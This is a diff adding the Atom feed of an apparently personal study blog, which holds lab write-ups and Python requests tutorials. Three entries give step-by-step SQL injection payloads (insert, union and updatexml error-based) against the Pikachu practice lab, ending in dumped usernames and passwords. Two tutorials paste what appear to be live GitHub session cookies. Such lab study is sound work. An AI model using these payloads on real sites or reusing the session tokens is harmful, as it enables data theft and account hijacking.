@@ -1,0 +1,274 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://somebodystark.github.io</id>
+    <title>Gridea</title>
+    <updated>2023-09-27T11:51:41.894Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://somebodystark.github.io"/>
+    <link rel="self" href="https://somebodystark.github.io/atom.xml"/>
+    <subtitle>温故而知新</subtitle>
+    <logo>https://somebodystark.github.io/images/avatar.png</logo>
+    <icon>https://somebodystark.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2023, Gridea</rights>
+    <entry>
+        <title type="html"><![CDATA[Sql注入之insert注入]]></title>
+        <id>https://somebodystark.github.io/post/sql-zhu-ru-zhi-insert-zhu-ru/</id>
+        <link href="https://somebodystark.github.io/post/sql-zhu-ru-zhi-insert-zhu-ru/">
+        </link>
+        <updated>2023-09-27T11:50:44.000Z</updated>
+        <content type="html"><![CDATA[<ol>
+<li>
+<p>判断是否存在注入点 输入' 页面报错 存在注入点<img src="C:%5CUsers%5C86183%5COneDrive%5C%E6%A1%8C%E9%9D%A2%5CSql%E6%B3%A8%E5%85%A5%E6%88%AA%E5%9B%BE%5C%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%82%B9.png" alt="" loading="lazy"></p>
+</li>
+<li>
+<p>查询数据库名称1' or updatexml(1,concat(0x7e,database()),0)  or '<img src="C:%5CUsers%5C86183%5COneDrive%5C%E6%A1%8C%E9%9D%A2%5CSql%E6%B3%A8%E5%85%A5%E6%88%AA%E5%9B%BE%5C%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="" loading="lazy"></p>
+</li>
+<li>
+<p>查询数据表名称 ’ or updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) or’</p>
+<figure data-type="image" tabindex="1"><img src="https://img1.imgtp.com/2023/09/27/bTzs4p6B.png" alt="" loading="lazy"></figure>
+<ol>
+<li>查询数据列名称 ' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='pikachu' and table_name='users')),1) or' <img src="https://img1.imgtp.com/2023/09/27/cj2Jfsf8.png" alt="查询数据列名称.png" loading="lazy"></li>
+</ol>
+<p>5.获取username，password字段内容' or updatexml(1,concat(0x7e,(select group_concat(username,password) from pikachu.users)),1）or' <img src="https://img1.imgtp.com/2023/09/27/74QM6riD.png" alt="获取username，password字段内容.png" loading="lazy"></p>
+</li>
+</ol>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Sql注入之联合查询]]></title>
+        <id>https://somebodystark.github.io/post/sql-zhu-ru-zhi-lian-he-cha-xun/</id>
+        <link href="https://somebodystark.github.io/post/sql-zhu-ru-zhi-lian-he-cha-xun/">
+        </link>
+        <updated>2023-09-24T09:34:49.000Z</updated>
+        <content type="html"><![CDATA[<ol>
+<li>
+<p>判断是否存在注入点  输入’   <img src="https://img1.imgtp.com/2023/09/25/3Nn53g01.png" alt="判断是否存在注入点.png" loading="lazy"></p>
+</li>
+<li>
+<p>判断字段 kobe' order by 2# <img src="https://img1.imgtp.com/2023/09/25/NX1ZlVfZ.png" alt="判断字段数.png" loading="lazy"></p>
+</li>
+<li>
+<p>判断回显点 kobe' union select 1,2#  <img src="https://img1.imgtp.com/2023/09/25/ImcICsNz.png" alt="判断回显点.png" loading="lazy"></p>
+</li>
+<li>
+<p>利用联合查询，查询数据库名称 kobe' union select 1,database()# <img src="https://img1.imgtp.com/2023/09/25/ZbDcyMpL.png" alt="查询数据库.png" loading="lazy"></p>
+</li>
+<li>
+<p>查询数据表名称  kobe' union select 1,table_name from information_schema.tables where table_schema=&quot;pikachu&quot;#<img src="https://img1.imgtp.com/2023/09/25/ooR9yio2.png" alt="数据表名称.png" loading="lazy"></p>
+</li>
+</ol>
+<p>6.查询数据列名称  kobe' union select 1,column_name from information_schema.columns where table_name=&quot;users&quot; # <img src="https://img1.imgtp.com/2023/09/25/8NJnruKL.png" alt="数据列名称.png" loading="lazy"></p>
+<ol start="7">
+<li>
+<p>拿去数据列中的内容 kobe' union select username,password from users#</p>
+<figure data-type="image" tabindex="1"><img src="https://img1.imgtp.com/2023/09/25/n7Xid3np.png" alt="拿去数据列中内容.png" loading="lazy"></figure>
+</li>
+</ol>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[sql注入漏洞之基于报错的方式来利用]]></title>
+        <id>https://somebodystark.github.io/post/sql-zhu-ru-lou-dong-zhi-ji-yu-bao-cuo-de-fang-shi-lai-li-yong/</id>
+        <link href="https://somebodystark.github.io/post/sql-zhu-ru-lou-dong-zhi-ji-yu-bao-cuo-de-fang-shi-lai-li-yong/">
+        </link>
+        <updated>2023-09-23T05:11:55.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="sql基于报错的方式来利用">sql基于报错的方式来利用</h3>
+<ol>
+<li>
+<p>updatexml()： 对xml文档数据进行查询和修改的XPATH函数</p>
+<p>updatexml(xml_doument,XPath_string,new_value)</p>
+<p>第一个参数：XML的内容<br>
+第二个参数：是需要update的位置XPATH路径<br>
+第三个参数：是更新后的内容</p>
+</li>
+</ol>
+<p>​	所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式</p>
+<ul>
+<li>
+<p>来个单引号，页面出错说明有注入点</p>
+</li>
+<li>
+<p>存在注入，利用updatexml函数，得到数据库版本名构造payload：kobe ' and updatexml(1,concat(0x7e,version()),1)#</p>
+<p>concat在mysql中就是起到连接两个数据作用</p>
+</li>
+<li>
+<p>得到数据库名，payload：kobe' and updatexml(1,concat(0x7e,database()),0)#      **数据库名是pikachu **</p>
+</li>
+<li>
+<p>获取表名，kobe' and updatexml(1,concat(0x7e,(select table_name  from information_schema.tables where table_schema='pikachu')),0)#           **table_schema 是数据库的名称 **</p>
+</li>
+<li>
+<p>回显不能超过一行 则需要用到limit函数  kobe' and updatexml(1,concat(0x7e,(select table_name  from information_schema.tables where table_schema='pikachu' limit 0,1)),0)#             <strong>获得表名 httpinfo member  messsage  users xssblind</strong></p>
+</li>
+<li>
+<p>获取列名    kobe' and updatexml(1,concat(0x7e,(select column_name  from information_schema.columns where table_name='users' limit 0,1)),0)#   <strong>username password</strong></p>
+</li>
+<li>
+<p>根据列名 获取数据  获取username的数据  kobe' and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0)#</p>
+</li>
+<li>
+<p>根据列名 获取数据  获取password的数据   kobe' and updatexml(1,concat(0x7e,(select password from users where username=&quot;admin&quot; limit 0,1)),0)#</p>
+</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[代理参数的使用]]></title>
+        <id>https://somebodystark.github.io/post/dai-li-can-shu-de-shi-yong/</id>
+        <link href="https://somebodystark.github.io/post/dai-li-can-shu-de-shi-yong/">
+        </link>
+        <updated>2023-09-18T14:50:41.000Z</updated>
+        <content type="html"><![CDATA[<p>代理参数的使用</p>
+<pre><code class="language-python">proxy = {
+    'http': 'http://127.0.0.1:7890',
+    'https': 'http://127.0.0.1:7890'
+}
+  response.get(url,proxies=proxies)
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[timeout 参数]]></title>
+        <id>https://somebodystark.github.io/post/timeout-can-shu/</id>
+        <link href="https://somebodystark.github.io/post/timeout-can-shu/">
+        </link>
+        <updated>2023-09-18T10:17:18.000Z</updated>
+        <content type="html"><![CDATA[<p>timeout参数</p>
+<pre><code class="language-python">import requests
+url = &quot;https://twitter.com&quot;
+response = requests.get(url,timeout=3)
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[cookie参数的使用]]></title>
+        <id>https://somebodystark.github.io/post/cookie-can-shu-de-shi-yong/</id>
+        <link href="https://somebodystark.github.io/post/cookie-can-shu-de-shi-yong/">
+        </link>
+        <updated>2023-09-18T07:56:15.000Z</updated>
+        <content type="html"><![CDATA[<p>import requests</p>
+<p>url=&quot;https://github.com/somebodystark&quot;<br>
+proxy = {<br>
+'http': 'http://127.0.0.1:7890',<br>
+'https': 'http://127.0.0.1:7890'<br>
+}<br>
+headers={<br>
+'User-Agent':<br>
+'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'<br>
+}</p>
+<h1 id="构建cookie字典-注意点-此处temp的内容不能够换行">构建cookie字典  注意点 此处temp=的内容不能够换行</h1>
+<p>temp='''_octo=GH1.1.757463868.1694914867; _device_id=71739741d200ae235799118044c6f885; user_session=ENJktKVIPuHnKlzNYH44h2-LQ7HVqxOLaAr38BN_udiwhLzm; __Host-user_session_same_site=ENJktKVIPuHnKlzNYH44h2-LQ7HVqxOLaAr38BN_udiwhLzm; logged_in=yes; dotcom_user=somebodystark; has_recent_activity=1; color_mode=%7B%22color_mode%22%3A%22auto%22%2C%22light_theme%22%3A%7B%22name%22%3A%22light%22%2C%22color_mode%22%3A%22light%22%7D%2C%22dark_theme%22%3A%7B%22name%22%3A%22dark%22%2C%22color_mode%22%3A%22dark%22%7D%7D; preferred_color_mode=light; tz=Asia%2FShanghai; _gh_sess=tHGO8YoGGTNCjcDppRNGtjrhcBeTPJzoROGPekvnIyBZG3U%2BFpD77HGrKuG63K1QIatxow8g%2BE17OgVIoVNW%2BNZi7X71tVmrjfsHwOufbOwHVMm%2BpiHMWfB8ScAYo72OMEitai53uzodb%2F1qbSKuaS01C3aOk4kc%2BMCefu5NdcRKlEppwaPzGIYdXG4WN5OnoGw%2BqhwPecIqa0FOrP1KBRaEzvDCuKWmFSK9zBqZHlmEM8LyhNl4P2lRi19VufQcxgRp2OQmzsoxlRu4J0JGNah3JHA8IKH3XOzXt5987a0%3D--dwqBD%2BfI9gzP%2Fpoq--G91FqY04hvWC9ngAfrnRhA%3D%3D'''</p>
+<h1 id="稳妥方案">稳妥方案</h1>
+<p>cookie_list =temp.split(&quot;; &quot;)  按照； 进行分割，将每个cookie分割成一个列表<br>
+cookies ={}  初始化一个空的字典cookies，用于储存解析后的cookie<br>
+for cookie in cookie_list:  遍历cookie_list列表中的每个cookie<br>
+cookies[cookie.split('=')[0]]=cookie.split('=')[-1] 通过等号进行分割，将每个cookie分割成名称和值，cookie.split('=')[0]为名称，cookie.split('=')[-1]是值，名称为字典的键，值为字典的值，将cookie存储到cookies字典中  索引[-1]表示获取列表中的最后一个元素<br>
+print(cookies)</p>
+<p>response = requests.get(url,headers=headers,cookies=cookies,proxies=proxy)</p>
+<p>with open(&quot;github_with_cookies2.html&quot;,&quot;wb&quot;)as f:<br>
+f.write(response.content)</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[在请求头中携带cookie]]></title>
+        <id>https://somebodystark.github.io/post/zai-qing-qiu-tou-zhong-xi-dai-cookie/</id>
+        <link href="https://somebodystark.github.io/post/zai-qing-qiu-tou-zhong-xi-dai-cookie/">
+        </link>
+        <updated>2023-09-18T06:57:31.000Z</updated>
+        <content type="html"><![CDATA[<p>import requests</p>
+<p>url=&quot;https://github.com/somebodystark&quot;<br>
+proxy = {<br>
+'http': 'http://127.0.0.1:7890',<br>
+'https': 'http://127.0.0.1:7890'<br>
+}<br>
+headers={<br>
+'User-Agent':<br>
+'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36','Cookie':<br>
+'_octo=GH1.1.757463868.1694914867; _device_id=71739741d200ae235799118044c6f885; user_session=ENJktKVIPuHnKlzNYH44h2-LQ7HVqxOLaAr38BN_udiwhLzm; __Host-user_session_same_site=ENJktKVIPuHnKlzNYH44h2-LQ7HVqxOLaAr38BN_udiwhLzm; logged_in=yes; dotcom_user=somebodystark; has_recent_activity=1; color_mode=%7B%22color_mode%22%3A%22auto%22%2C%22light_theme%22%3A%7B%22name%22%3A%22light%22%2C%22color_mode%22%3A%22light%22%7D%2C%22dark_theme%22%3A%7B%22name%22%3A%22dark%22%2C%22color_mode%22%3A%22dark%22%7D%7D; preferred_color_mode=light; tz=Asia%2FShanghai; _gh_sess=tHGO8YoGGTNCjcDppRNGtjrhcBeTPJzoROGPekvnIyBZG3U%2BFpD77HGrKuG63K1QIatxow8g%2BE17OgVIoVNW%2BNZi7X71tVmrjfsHwOufbOwHVMm%2BpiHMWfB8ScAYo72OMEitai53uzodb%2F1qbSKuaS01C3aOk4kc%2BMCefu5NdcRKlEppwaPzGIYdXG4WN5OnoGw%2BqhwPecIqa0FOrP1KBRaEzvDCuKWmFSK9zBqZHlmEM8LyhNl4P2lRi19VufQcxgRp2OQmzsoxlRu4J0JGNah3JHA8IKH3XOzXt5987a0%3D--dwqBD%2BfI9gzP%2Fpoq--G91FqY04hvWC9ngAfrnRhA%3D%3D'</p>
+<p>}<br>
+response = requests.get(url,headers=headers,proxies=proxy)</p>
+<p>with open(&quot;github_with_cookies.html&quot;,&quot;wb&quot;) as f :<br>
+f.write(response.content)</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[requests的基本使用]]></title>
+        <id>https://somebodystark.github.io/post/requests-de-ji-ben-shi-yong/</id>
+        <link href="https://somebodystark.github.io/post/requests-de-ji-ben-shi-yong/">
+        </link>
+        <updated>2023-09-17T17:22:45.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="导入模块">导入模块</h1>
+<p>import requests</p>
+<h1 id="发送请求获取响应">发送请求，获取响应</h1>
+<p>response = requests.get(&quot;http://www.baidu.com&quot;)</p>
+<h1 id="获取响应数据">获取响应数据</h1>
+<p>&quot;&quot;&quot;response.encoding = &quot;utf-8&quot;<br>
+print(response.text)&quot;&quot;&quot;</p>
+<h1 id="printresponsecontent-输出内容以二进制形式显示">print(response.content)  输出内容以二进制形式显示</h1>
+<p>print(response.content.decode())</p>
+<h1 id="decode解码默认是utf-8解码">decode解码默认是utf-8解码</h1>
+<h1 id="response的常见参数">response的常见参数</h1>
+<h1 id="响应url">响应url</h1>
+<p>print(response.url)</p>
+<h1 id="状态码">状态码</h1>
+<h1 id="printresponsestatus_code">print(response.status_code)</h1>
+<h1 id="响应对应的请求头-ua头">响应对应的请求头  UA头</h1>
+<h1 id="printresponserequestheaders">print(response.request.headers)</h1>
+<h1 id="printn">print(&quot;\n&quot;)</h1>
+<h1 id="响应头-set-cookie的值最为重要">响应头 Set-cookie的值最为重要</h1>
+<h1 id="printresponseheaders">print(response.headers)</h1>
+<h1 id="答应响应设置的cookies">答应响应设置的cookies</h1>
+<h1 id="printresponsecookies">print(response.cookies)</h1>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[发送带参数的请求]]></title>
+        <id>https://somebodystark.github.io/post/fa-song-dai-can-shu-de-qing-qiu/</id>
+        <link href="https://somebodystark.github.io/post/fa-song-dai-can-shu-de-qing-qiu/">
+        </link>
+        <updated>2023-09-17T17:22:17.000Z</updated>
+        <content type="html"><![CDATA[<p>import requests</p>
+<h1 id="第一种方法在url中直接带参数">第一种方法：在url中直接带参数</h1>
+<h1 id=""></h1>
+<pre><code class="language-url">headers ={
+'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0'
+}
+response = requests.get(url,headers=headers)
+with open('baidu.html','wb')as f:
+    f.write(response.content) ```
+
+# 第二种方法：构建字典，交给params参数
+``` url = &quot;https://cn.bing.com/search?&quot;
+headers ={
+'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0'
+}
+data={
+'q':'python'
+}
+response = requests.get(url,headers=headers,params=data)
+print(response.url)
+with open('baidu1.html','wb')as f:
+    f.write(response.content) ```</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[发送带请求头的请求]]></title>
+        <id>https://somebodystark.github.io/post/fa-song-dai-qing-qiu-tou-de-qing-qiu/</id>
+        <link href="https://somebodystark.github.io/post/fa-song-dai-qing-qiu-tou-de-qing-qiu/">
+        </link>
+        <updated>2023-09-17T17:21:22.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="发送带请求头的请求">发送带请求头的请求</h1>
+<h1 id="导入模块">导入模块</h1>
+<p>import requests</p>
+<h1 id="发送请求获取响应">发送请求，获取响应</h1>
+<p>url = &quot;http://www.baidu.com&quot;</p>
+<h1 id="构建请求头字典">构建请求头字典</h1>
+<p>headers ={<br>
+'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0'<br>
+}<br>
+response =requests.get(url,headers=headers)</p>
+<p>print(response.content.decode())<br>
+print(len(response.content.decode()))</p>
+]]></content>
+    </entry>
+</feed>
